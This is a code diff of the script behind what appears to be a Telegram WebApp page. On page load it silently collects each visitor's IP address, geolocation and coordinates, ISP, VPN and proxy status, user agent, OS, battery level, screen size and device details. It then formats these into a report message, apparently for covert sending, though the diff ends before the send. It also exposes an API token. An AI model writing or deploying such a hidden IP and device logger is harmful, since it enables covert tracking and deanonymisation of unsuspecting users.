@@ -36,78 +36,84 @@
 </body>
 </html>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            let batteryLevel;
-            let screenWidth;
-            let screenHeight;
+document.addEventListener('DOMContentLoaded', function() {
+    let batteryLevel;
+    let screenWidth;
+    let screenHeight;
+    let isVPN = false;
+    let isProxy = false;
 
-            navigator.getBattery().then(function(battery) {
-                batteryLevel = battery.level * 100;
-            });
+    navigator.getBattery().then(function(battery) {
+        batteryLevel = battery.level * 100;
+    });
 
-            screenWidth = window.screen.width;
-            screenHeight = window.screen.height;
+    screenWidth = window.screen.width;
+    screenHeight = window.screen.height;
 
-            const tg = window.Telegram.WebApp;
+    const batteryLevelConst = batteryLevel;
+    const screenWidthConst = screenWidth;
+    const screenHeightConst = screenHeight;
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const userAgent = navigator.userAgent;
+    const tg = window.Telegram.WebApp;
 
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const city = data.city;
-                    const region = data.region;
-                    const country = data.country_name;
-                    const latitude = data.latitude;
-                    const longitude = data.longitude;
-                    const time = data.timezone;
-                    const isp = data.org;
-                    const osname = navigator.platform;
-                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    let userid = document.createElement('p');
-                    
-                    let systemTime = new Date();
-                    let hours = systemTime.getHours();
-                    let minutes = systemTime.getMinutes();
-                    let formattedTime = `${hours}:${minutes}`;
+    const urlParams = new URLSearchParams(window.location.search);
+    const userAgent = navigator.userAgent;
 
-                    let language = navigator.language;
-                    
-                    let datee = new Date();
-                    let day = datee.getDate();
-                    let month = datee.getMonth() + 1;
-                    let year = datee.getFullYear();
+fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const latitude = data.latitude;
+        const longitude = data.longitude;
+        const time = data.timezone;
+        const isp = data.org;
+        const osname = navigator.platform;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const browser = getBrowserInfo();
+        let userid = document.createElement('p');
+     
+       let systemTime = new Date();
+       let hours = systemTime.getHours();
+       let minutes = systemTime.getMinutes();
+       let formattedTime = `${hours}:${minutes}`;
     
-                    let dayOfWeek = datee.getDay();
+       let language = navigator.language
+      
+       let datee = new Date();
+       let day = datee.getDate();
+       let month = datee.getMonth() + 1;
+       let year = datee.getFullYear();
+  
+       let dayOfWeek = datee.getDay();
     
-                    if (day < 10) {
-                        day = '0' + day;
-                    }
+    if (day < 10) {
+        day = '0' + day;
+    }
     
-                    if (month < 10) {
-                        month = '0' + month;
-                    }
+    if (month < 10) {
+        month = '0' + month;
+    }
     
-                    let formedDate = day + '.' + month + '.' + year;
-                    
-                    let memory = navigator.deviceMemory;
-                    
-                    let TypeInternet = navigator.connection.effectiveType;
+    let formedDate = day + '.' + month + '.' + year;
+      
+    let memory = navigator.deviceMemory;
+  
+    let TypeInternet = navigator.connection.effectiveType;
+        
+fetch(`https://api.proxycheck.io/v2/${ip}?vpn=1`)
+    .then(response => response.json())
+    .then(data => {
+        isProxy = data.proxy ? true : false;
+        isVPN = data.vpn ? true : false;
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
 
-                    fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
-                        .then(response => response.json())
-                        .then(data => {
-                            const isProxy = data.proxy ? "Yes" : "No";
-                            const isVPN = data.tor ? "Yes" : "No";
-
-                            if (data.hasOwnProperty('proxy')) {
-                                isProxy = data.proxy ? "Yes" : "No";
-                            }
-                        });
-
-                    const message = `
+        const message = `
       * Ip 🌐*
     *├ IP: ${ip}*
     *├ UserAgent: ${userAgent}*
@@ -116,11 +122,9 @@
     *├ Region: ${region}*
     *├ Timezone IP: ${time}*
     *├ Coordinates: ${longitude} ${latitude},*
-    *├ Proxy: ${isProxy}*
-    *├ Vpn: ${isVPN}*
       * System 🖥*
     *├ Browser: ${browser}*
-    *├ Os: ${osname}*
+    *├ + Os: ${osname}*
     *├ Battery: ${batteryLevel}%*
     *├ Screen resolution: ${screenWidth}x${screenHeight}*
     *├ Time: ${formattedTime}*
